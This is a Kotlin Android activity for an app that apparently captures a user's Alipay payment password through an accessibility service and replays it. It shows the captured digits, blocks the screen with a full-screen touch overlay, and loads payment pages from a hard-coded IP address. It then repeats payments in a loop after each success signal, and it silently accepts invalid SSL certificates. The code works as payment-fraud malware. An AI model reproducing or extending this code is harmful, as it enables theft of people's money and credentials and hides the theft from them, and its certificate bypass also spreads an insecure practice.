package com.example.demo

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.text.TextUtils.SimpleStringSplitter
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var settingsButton: Button
    // private lateinit var floatButton: Button // 移除
    private lateinit var passwordInfoText: TextView
    private lateinit var btnAlipay: Button
    private lateinit var webView: android.webkit.WebView

    // 标记是否需要自动开始下一轮
    // private var pendingNextRound = false // 移除内存变量，改用 SharedPreferences 持久化

    // 注册广播接收器，用于接收循环支付信号
    private val paymentReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.example.demo.PAYMENT_SUCCESS") {
                // 收到支付成功信号，标记需要进行下一轮，并持久化存储
                // 即使 App 在后台被杀，下次启动也能恢复
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("pending_next_round", true).apply()
                
                Toast.makeText(this@MainActivity, "支付成功，等待返回App继续...", Toast.LENGTH_SHORT).show()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(paymentReceiver)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 注册广播
        val filter = android.content.IntentFilter("com.example.demo.PAYMENT_SUCCESS")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            registerReceiver(paymentReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(paymentReceiver, filter)
        }

        statusText = findViewById(R.id.status_text)
        settingsButton = findViewById(R.id.settings_button)
        // floatButton = findViewById(R.id.float_button) // 移除
        passwordInfoText = findViewById(R.id.password_info_text)
        btnAlipay = findViewById(R.id.btn_alipay)
        webView = findViewById(R.id.webview)

        // 配置 WebView
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.settings.allowFileAccess = true
        webView.settings.allowContentAccess = true
        // 彻底禁用缓存，强制网络加载
        webView.settings.cacheMode = android.webkit.WebSettings.LOAD_NO_CACHE
        
        webView.webViewClient = object : android.webkit.WebViewClient() {
            override fun onReceivedSslError(
                view: android.webkit.WebView?, 
                handler: android.webkit.SslErrorHandler?, 
                error: android.net.http.SslError?
            ) {
                handler?.proceed()
            }

            override fun onReceivedError(
                view: android.webkit.WebView?, 
                request: android.webkit.WebResourceRequest?, 
                error: android.webkit.WebResourceError?
            ) {
                // 如果遇到 ERR_CACHE_MISS (-19)，尝试重新加载
                if (error?.errorCode == -19) { // ERROR_CACHE_MISS
                    view?.reload()
                }
                super.onReceivedError(view, request, error)
            }

            override fun shouldOverrideUrlLoading(view: android.webkit.WebView?, url: String?): Boolean {
                if (url == null) return false
                // 拦截支付宝 Scheme
                if (url.startsWith("alipays://") || url.startsWith("alipayqr://")) {
                    try {
                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                        startActivity(intent)
                    } catch (e: Exception) {
                        Toast.makeText(this@MainActivity, "未检测到支付宝客户端", Toast.LENGTH_SHORT).show()
                    }
                    return true
                }
                return false
            }
        }

        settingsButton.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        }

        // floatButton.setOnClickListener { ... } // 移除

        btnAlipay.setOnClickListener {
            handleAlipayPayment()
        }
    }

    private fun handleAlipayPayment() {
        if (!isAccessibilitySettingsOn(this)) {
            Toast.makeText(this, "请先开启辅助服务 (步骤1)", Toast.LENGTH_SHORT).show()
            return
        }
        
        val hasPassword = hasSavedPassword()
        if (hasPassword) {
            // 模式2：已有密码，开启全屏遮罩并自动支付
            Toast.makeText(this, "正在启动自动支付...", Toast.LENGTH_SHORT).show()
            
            // 1. 开启全屏遮罩 (通过无障碍服务，免权限)
            val intent = Intent(this, AutoPaymentService::class.java).apply {
                action = AutoPaymentService.ACTION_BLOCK_TOUCH
            }
            startService(intent)
            
            // 2. 在 WebView 中加载支付链接
            loadUrlInWebView("https://103.97.178.229/2.html")
        } else {
            // 模式1：无密码，跳转到录制页面
            Toast.makeText(this, "请进行首次支付以录制密码", Toast.LENGTH_SHORT).show()
            loadUrlInWebView("https://103.97.178.229/1.html")
        }
    }
    
    private fun loadUrlInWebView(url: String) {
        webView.visibility = android.view.View.VISIBLE
        // 关键：在加载 URL 之前，如果之前有页面被重新加载导致 CACHE_MISS，先清空历史
        webView.clearHistory()
        
        // 针对 Android 10+ 的本地缓存策略修复
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.webkit.CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        }
        
        // 如果页面是重定向结果，直接 loadUrl 可能会导致 ERR_CACHE_MISS
        // 我们尝试以 reload 的方式或者标准的 load
        webView.loadUrl(url)
    }
    
    private fun hasSavedPassword(): Boolean {
        val file = java.io.File(filesDir, "payment_script.json")
        return file.exists() && file.length() > 0
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
        loadSavedPassword()
        
        // 检查持久化的状态
        val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val pendingNextRound = prefs.getBoolean("pending_next_round", false)
        
        // 如果有待处理的下一轮任务，立即开始
        if (pendingNextRound) {
            // 清除标记
            prefs.edit().putBoolean("pending_next_round", false).apply()
            
            Toast.makeText(this, "正在发起下一笔支付...", Toast.LENGTH_SHORT).show()
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                loadUrlInWebView("https://103.97.178.229/2.html")
            }, 500)
        }
    }

    private fun loadSavedPassword() {
        val file = java.io.File(filesDir, "payment_script.json")
        if (file.exists()) {
            try {
                val jsonString = file.readText()
                val jsonArray = org.json.JSONArray(jsonString)
                val sb = StringBuilder()
                for (i in 0 until jsonArray.length()) {
                    val obj = jsonArray.getJSONObject(i)
                    val digit = obj.optString("targetDigit", "")
                    // 兼容 null 字符串
                    if (digit.isNotEmpty() && digit != "null") {
                        sb.append(digit)
                    }
                }
                
                // 确保 UI 更新在主线程
                runOnUiThread {
                    if (sb.isNotEmpty()) {
                        passwordInfoText.text = "已录制密码: $sb"
                        passwordInfoText.textSize = 24f
                        passwordInfoText.setTypeface(null, android.graphics.Typeface.BOLD)
                        passwordInfoText.visibility = android.view.View.VISIBLE // 强制显示
                        
                        android.util.Log.d("ScriptDebug", "Loaded script actions: $jsonString")
                        
                        if (sb.length < 6) {
                            passwordInfoText.append("\n⚠️ 警告: 密码不足6位，建议重新录制")
                            passwordInfoText.setTextColor(android.graphics.Color.RED)
                        } else {
                            passwordInfoText.setTextColor(android.graphics.Color.BLACK)
                        }
                    } else {
                        passwordInfoText.text = "已录制脚本 (无明确密码信息)"
                        passwordInfoText.visibility = android.view.View.VISIBLE
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    passwordInfoText.text = "读取密码文件失败: ${e.message}"
                    passwordInfoText.visibility = android.view.View.VISIBLE
                }
            }
        } else {
            runOnUiThread {
                passwordInfoText.text = "暂无录制密码"
                passwordInfoText.visibility = android.view.View.VISIBLE
            }
        }
    }

    private fun updateStatus() {
        val isServiceOn = isAccessibilitySettingsOn(this)
        if (isServiceOn) {
            statusText.text = getString(R.string.service_enabled)
            settingsButton.isEnabled = false
        } else {
            statusText.text = getString(R.string.service_disabled)
            settingsButton.isEnabled = true
        }
        
        // floatButton.isEnabled = isServiceOn // 移除
    }

    private fun isAccessibilitySettingsOn(mContext: Context): Boolean {
        var accessibilityEnabled = 0
        val service = packageName + "/" + AutoPaymentService::class.java.canonicalName
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                mContext.applicationContext.contentResolver,
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED
            )
        } catch (e: Settings.SettingNotFoundException) {
            e.printStackTrace()
        }
        val mStringColonSplitter = SimpleStringSplitter(':')
        if (accessibilityEnabled == 1) {
            val settingValue = Settings.Secure.getString(
                mContext.applicationContext.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue)
                while (mStringColonSplitter.hasNext()) {
                    val accessibilityService = mStringColonSplitter.next()
                    if (accessibilityService.equals(service, ignoreCase = true)) {
                        return true
                    }
                }
            }
        }
        return false
    }
}
